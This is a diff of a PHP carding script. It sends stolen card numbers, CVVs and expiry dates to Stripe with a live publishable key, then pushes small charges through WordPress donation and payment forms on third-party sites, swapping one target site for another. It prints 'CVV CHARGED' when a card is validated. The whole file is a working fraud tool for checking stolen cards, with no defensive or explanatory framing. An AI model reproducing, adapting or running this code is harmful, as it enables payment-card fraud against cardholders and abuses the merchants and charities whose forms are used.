@@ -87,7 +87,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 ////////////////////////////===[1 Req Postfields]
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51OKEhWBGWy1jRB0rDTwbHcXKScpVLiu1jPVgmXvLxPhErXoOgIEEaayQtmr8M0bbLWRhYQ8nfQ8NFhHYFJEEifb000RjXRuH2t');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51OcW1ZHn9aam2LnOovdCzNOxhZ2MODSGMIa6rASbULadOkAKW2bjixaUFRiDH3RpWRA3Pbw1ND80Kx8IRfRwb2sC0052hhp8Zk');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -96,7 +96,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 sleep(10);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://tctamn.org/wp-admin/admin-ajax.php?t=1716514915178');
+curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716525183623');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -107,29 +107,29 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1716514915178 h2',
-'Host: tctamn.org',
-'accept: */*',
-'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'origin: https://tctamn.org',
-'sec-fetch-site: same-origin',
-'sec-fetch-mode: cors',
-'sec-fetch-dest: empty',
-'referer: https://tctamn.org/donation/',
-'accept-language: en-US,en;q=0.9',
+'POST /wp-admin/admin-ajax.php?t=1716525183623 HTTP/1.1',
+'Host: marthahealthsolutions.com',
+'Accept: */*',
+'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'Origin: https://marthahealthsolutions.com',
+'Sec-Fetch-Site: same-origin',
+'Sec-Fetch-Mode: cors',
+'Sec-Fetch-Dest: empty',
+'Referer: https://marthahealthsolutions.com/payment-proceed/',
+'Accept-Language: en-US,en;q=0.9',
 ));
 
 ////////////////////////////===[2 Req Postfields]////////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2050%26_fluentform_3_fluentformnonce%3Da3b030d75a%26_wp_http_referer%3D%252Fdonation%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D5%26input_text%3D%26description%3D%26payment_method%3Dstripe%26item__3__fluent_checkme_%3D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D405%26_fluentform_3_fluentformnonce%3D385efa0cca%26_wp_http_referer%3D%252Fpayment-proceed%252F%26names%255Bfirst_name%255D%3D%26numeric-field%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26email%3D%26phone%3D%26datetime%3D24%252F05%252F2024%26custom-payment-amount%3D1%26numeric-field_1%3D%26description%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2 = curl_exec($ch);
 
 ////////////////////////////===[Responses CVV]===////////////////////////////
 
 if
-(strpos($result2,  'success')) {
+(strpos($result2,  'Thank you for your Payment.')) {
   echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 5$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
 }
 
